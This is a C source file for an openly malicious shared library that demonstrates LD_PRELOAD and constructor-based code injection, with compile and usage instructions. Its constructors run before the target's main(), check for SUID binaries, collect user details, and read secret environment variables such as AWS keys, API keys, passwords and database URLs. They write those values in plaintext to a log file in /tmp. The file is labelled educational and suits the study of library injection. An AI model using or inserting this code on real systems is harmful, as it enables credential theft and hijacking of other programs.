/*
 * evil_constructor.c - Malicious Shared Library with Constructors
 *
 * This library demonstrates code execution via constructors when
 * loaded into a process via:
 *   - LD_PRELOAD
 *   - DT_RPATH/DT_RUNPATH hijacking
 *   - dlopen() in vulnerable code
 *
 * The constructor runs BEFORE main() of the target program,
 * giving the attacker early code execution.
 *
 * Compile: gcc -shared -fPIC -o evil_constructor.so evil_constructor.c
 * Usage:   LD_PRELOAD=./evil_constructor.so ./victim
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/init_injection_log.txt"

/* ═══════════════════════════════════════════════════════════════════════════
 * LOGGING
 * ═══════════════════════════════════════════════════════════════════════════ */

static void log_event(const char *event, const char *details) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%ld] %s: %s\n", now, event, details);
        fclose(log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR - Runs BEFORE main() of target process
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Priority 101 = runs early (lower number = higher priority)
 */

__attribute__((constructor(101)))
void evil_early_init(void) {
    /* This runs VERY early, even before some libc initialization */

    /* Clear log file and start session */
    FILE *log = fopen(LOG_FILE, "w");
    if (log) {
        fprintf(log, "═══════════════════════════════════════════════════════════\n");
        fprintf(log, "  INIT/FINI INJECTION LOG\n");
        fprintf(log, "  PID: %d\n", getpid());
        fprintf(log, "═══════════════════════════════════════════════════════════\n\n");
        fclose(log);
    }

    log_event("CONSTRUCTOR_101", "Early priority constructor executed");
}

__attribute__((constructor))
void evil_main_init(void) {
    /* Display banner */
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "         ★ MALICIOUS CONSTRUCTOR EXECUTED! ★                   " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  This code is running BEFORE the target's main() function!    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  The target program has no control over this execution.        " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    /* Gather information about the process */
    fprintf(stderr, CYAN "  [RECON] Gathering process information...\n" RESET);

    /* Get process info */
    pid_t pid = getpid();
    pid_t ppid = getppid();
    uid_t uid = getuid();
    uid_t euid = geteuid();

    fprintf(stderr, "  ├─ PID:  %d\n", pid);
    fprintf(stderr, "  ├─ PPID: %d\n", ppid);
    fprintf(stderr, "  ├─ UID:  %d (EUID: %d)\n", uid, euid);

    /* Check if SUID */
    if (uid != euid) {
        fprintf(stderr, "  ├─ " RED "★ SUID BINARY DETECTED! ★" RESET "\n");
        log_event("SUID_DETECTED", "Running as SUID binary");
    }

    /* Get username */
    struct passwd *pw = getpwuid(uid);
    if (pw) {
        fprintf(stderr, "  ├─ User: %s\n", pw->pw_name);
        fprintf(stderr, "  └─ Home: %s\n", pw->pw_dir);
    }

    /* Log captured data */
    char details[256];
    snprintf(details, sizeof(details), "PID=%d PPID=%d UID=%d EUID=%d",
             pid, ppid, uid, euid);
    log_event("PROCESS_INFO", details);

    /* Check environment for secrets */
    fprintf(stderr, "\n");
    fprintf(stderr, CYAN "  [RECON] Checking environment for secrets...\n" RESET);

    const char *sensitive_vars[] = {
        "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID",
        "API_KEY", "SECRET_KEY", "PASSWORD", "TOKEN",
        "DATABASE_URL", "REDIS_URL", NULL
    };

    for (int i = 0; sensitive_vars[i]; i++) {
        char *val = getenv(sensitive_vars[i]);
        if (val) {
            fprintf(stderr, "  " RED "★ FOUND: %s" RESET "\n", sensitive_vars[i]);
            snprintf(details, sizeof(details), "%s=%s", sensitive_vars[i], val);
            log_event("SECRET_FOUND", details);
        }
    }

    fprintf(stderr, "\n");
    fprintf(stderr, GREEN "  [INFO] Constructor complete. Target's main() will now run.\n" RESET);
    fprintf(stderr, "\n");

    log_event("CONSTRUCTOR_DEFAULT", "Main constructor completed, passing to target");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR - Runs AFTER main() of target process returns
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
void evil_cleanup(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "         ★ MALICIOUS DESTRUCTOR EXECUTED! ★                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Target's main() has returned. Destructor running now.         " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Could exfiltrate data, establish persistence, etc.            " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log saved to: " BLUE "/tmp/init_injection_log.txt" RESET "                " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("DESTRUCTOR", "Cleanup destructor executed - session complete");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ADDITIONAL CONSTRUCTORS WITH PRIORITIES
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor(101)))
void evil_final_cleanup(void) {
    /* This runs LAST among destructors (lowest priority number = last) */
    log_event("DESTRUCTOR_101", "Final cleanup destructor - truly last code to run");
}
